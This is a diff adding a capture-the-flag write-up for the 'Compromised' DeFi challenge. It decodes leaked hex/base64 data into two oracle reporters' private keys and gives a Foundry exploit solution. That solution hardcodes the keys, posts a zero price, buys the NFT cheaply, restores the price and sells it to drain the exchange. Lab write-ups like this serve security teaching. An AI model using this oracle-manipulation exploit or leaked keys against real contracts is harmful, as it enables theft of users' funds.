@@ -464,3 +464,82 @@ Attack flow:
         vm.warp(block.timestamp + 2 days);
         drainer.executeProposal();
     }
+
+
+## 6. Compromised
+
+### Challenge Overview
+
+While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:  
+
+```
+HTTP/2 200 OK   
+content-type: text/html 
+content-language: en    
+vary: Accept-Encoding   
+server: cloudflare  
+
+4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30 
+
+4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35 
+``` 
+
+A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.  
+This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.    
+Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.
+
+### Vulnerability Analysis
+
+The challenge presents a strange server response from a popular DeFi project. While the `content-type` header indicates `text/html`, the actual content is hexadecimal data - a clear sign of a potential data leak.
+The data leak can be something critical. Converting the hex data to ASCII revealed base64-encoded strings. Decoding these base64 strings reveled a string very similar Ethereum private key. Using the Foundry cast command `cast wallet address --private-key $PRIVATE_KEY`, we confirmed that the decoded strings were indeed private keys corresponding to two of the three trusted oracle reporters. This means that we can manipulate the NFT price.   
+
+Attack flow:
+
+1. Extract private keys from leaked data    
+2. Manipulate price downward    
+3. Buy NFT at manipulated price 
+4. Reset oracle price   
+5. Sell NFT at inflated price   
+
+### Solution
+
+   /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_compromised() public checkSolved {
+        
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address source1 = vm.addr(privateKey1);
+        address source2 = vm.addr(privateKey2);
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        uint256 price = oracle.getMedianPrice("DVNFT");
+
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        vm.startPrank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+    }
